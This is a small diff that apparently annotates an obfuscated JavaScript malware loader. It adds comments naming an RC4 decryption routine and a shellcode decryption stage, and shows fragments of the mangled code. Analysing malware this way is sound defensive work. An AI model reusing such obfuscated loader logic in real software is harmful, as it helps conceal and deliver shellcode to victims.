@@ -985,7 +985,7 @@ function sdffg5fg(_url, _key) {
         return c[a[b.f]] = 0, c;
     }
 
-    function Il1IDa(a, b) {
+    function Il1IDa(a, b) {           /*  RC4 decryption routine */
         for (var c = Il1I_(), d = [], e = 0, f, g = "", h = 0; h < c.$; h++) {
             d[h] = h;
         }
@@ -1661,7 +1661,7 @@ function sdffg5fg(_url, _key) {
         return b;
     }
 
-    Il1I9.prototype.N = function () {
+    Il1I9.prototype.N = function () {           /* Shellcode Decryption Stage */
         if (this.M) {
             return this.M;
         }
